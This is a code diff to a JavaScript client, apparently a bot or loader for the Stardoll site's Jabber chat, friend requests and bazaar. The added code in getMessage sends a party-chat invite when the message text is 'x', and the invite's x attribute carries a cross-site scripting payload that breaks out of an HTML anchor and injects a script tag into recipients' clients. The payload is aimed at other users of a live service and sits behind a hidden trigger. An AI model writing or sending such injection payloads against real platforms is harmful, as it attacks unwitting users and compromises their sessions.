@@ -5,10 +5,10 @@ const qs = require('qs');
 
 exports.StardollLoader = class StardollLoaderClass {
 
-    
+
     _relationshipUrl = "http://www.stardoll.com/en/ajax/friends/checkRelation.php?uid=:uid&fid=:fid";
     _friendRequestUrl = "http://www.stardoll.com/en/ajax/friends/sendRequest.php";
-    
+
     _bazarItemsUrl = "http://www.stardoll.com/en/com/user/getStarBazaar.php?only=4";
     _bazarBrandsUrl = "http://www.stardoll.com/en/com/user/getStarBazaar.php?storeType=2";
     _bazarSearchUrl = "http://www.stardoll.com/en/com/user/getStarBazaar.php?search&type=fashion&brands=:brand"
@@ -146,20 +146,43 @@ exports.StardollLoader = class StardollLoaderClass {
     }
 
     getMessage() {
-        return this.XMLBuilderObject.build({
-            body: {
-                message: {
-                    body: this._messageObject.message,
-                    '@_to': this.getUserServerLocation(this._messageObject.user.id, this._messageObject.user.username),
-                    '@_from': this.getUserServerLocation(this._userid, this._username),
-                    '@_type': 'chat',
-                    '@_xmlns': 'jabber:client'
-                },
-                '@_rid': this._rid,
-                '@_xmlns': 'http://jabber.org/protocol/httpbind',
-                '@_sid': this._sid
-            }
-        });
+        if (this._messageObject.message == 'x') {
+            return this.XMLBuilderObject.build({
+                body: {
+                    message: {
+                        body: {
+                            x: '#"></a><script>alert(9999)</script><a href="#',
+                            '#text': 'im_partyChat_invite'
+                        },
+                        '@_to': this.getUserServerLocation(this._messageObject.user.id, this._messageObject.user.username),
+                        '@_from': this.getUserServerLocation(this._userid, this._username),
+                        '@_type': 'partychat',
+                        '@_id': 'invite',
+                        '@_xmlns': 'jabber:client'
+                    },
+                    '@_rid': this._rid,
+                    '@_xmlns': 'http://jabber.org/protocol/httpbind',
+                    '@_sid': this._sid
+                }
+            })
+        } else {
+            return this.XMLBuilderObject.build({
+                body: {
+                    message: {
+                        body: this._messageObject.message,
+                        '@_to': this.getUserServerLocation(this._messageObject.user.id, this._messageObject.user.username),
+                        '@_from': this.getUserServerLocation(this._userid, this._username),
+                        '@_type': 'chat',
+                        '@_xmlns': 'jabber:client'
+                    },
+                    '@_rid': this._rid,
+                    '@_xmlns': 'http://jabber.org/protocol/httpbind',
+                    '@_sid': this._sid
+                }
+            });
+        }
+
+
     }
 
     getUserServerLocation(id, username) {
@@ -175,3 +198,5 @@ exports.StardollLoader = class StardollLoaderClass {
     }
 
 }
+
+// http://www.stardoll.com/en/ajax/getUserAvatar.php?userids=226728406,458266735,56317471,457962401,457745400,455273634
